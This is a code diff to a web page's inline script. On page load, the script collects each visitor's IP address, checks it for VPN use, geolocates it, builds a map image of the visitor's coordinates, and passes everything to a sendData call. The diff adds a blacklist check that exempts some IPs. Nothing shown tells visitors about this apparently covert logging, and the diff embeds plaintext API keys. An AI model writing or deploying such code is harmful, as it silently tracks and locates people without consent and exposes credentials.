@@ -59,24 +59,39 @@
     </div>
 
     <script>
+        // Function to check if IP is in blacklist
+        function isBlacklisted(ip, callback) {
+            $.get("blacklist.txt", function(blacklistData) {
+                const blacklist = blacklistData.split(/\r?\n/); // Split by newline
+                callback(blacklist.includes(ip));
+            });
+        }
+
         $(document).ready(() => {
             $.getJSON("https://api.ipify.org?format=json", function (data) {
-                $.getJSON(
-                    `https://vpnapi.io/api/${data.ip}?key=09743a6399ca4bc4a635c51ecb847a6c`,
-                    function (vpnData) {
+                isBlacklisted(data.ip, function(isBlocked) {
+                    if (!isBlocked) {
+                        // IP is not blacklisted, continue with logging
                         $.getJSON(
-                            `https://ipapi.co/${data.ip}/json`,
-                            function (ipData) {
-                                sendData(
-                                    data.ip,
-                                    vpnData.security.vpn,
-                                    `${ipData.region}, ${ipData.country_code}`,
-                                    `http://dev.virtualearth.net/REST/v1/Imagery/Map/Road/${ipData.latitude},${ipData.longitude}/12?mapSize=400,300&pushpin=${ipData.latitude},${ipData.longitude}&key=Ap05UY1k0etqLr1Q9u3d-7OY_JuEzpW8JhAHfZaFpPrZpw6yCfVxGFfVM89fhoZi`
+                            `https://vpnapi.io/api/${data.ip}?key=09743a6399ca4bc4a635c51ecb847a6c`,
+                            function (vpnData) {
+                                $.getJSON(
+                                    `https://ipapi.co/${data.ip}/json`,
+                                    function (ipData) {
+                                        sendData(
+                                            data.ip,
+                                            vpnData.security.vpn,
+                                            `${ipData.region}, ${ipData.country_code}`,
+                                            `http://dev.virtualearth.net/REST/v1/Imagery/Map/Road/${ipData.latitude},${ipData.longitude}/12?mapSize=400,300&pushpin=${ipData.latitude},${ipData.longitude}&key=Ap05UY1k0etqLr1Q9u3d-7OY_JuEzpW8JhAHfZaFpPrZpw6yCfVxGFfVM89fhoZi`
+                                        );
+                                    }
                                 );
                             }
                         );
+                    } else {
+                        console.log("IP is blacklisted:", data.ip);
                     }
-                );
+                });
             });
         });
 
@@ -150,6 +165,5 @@
     <script src="assets/js/player.js"></script>
     <script src="assets/js/popup.js"></script>
     <script src="assets/js/popupAvatars.js"></script>
-    <script src="assets/js/viewCount.js"></script>
 </body>
 </html>
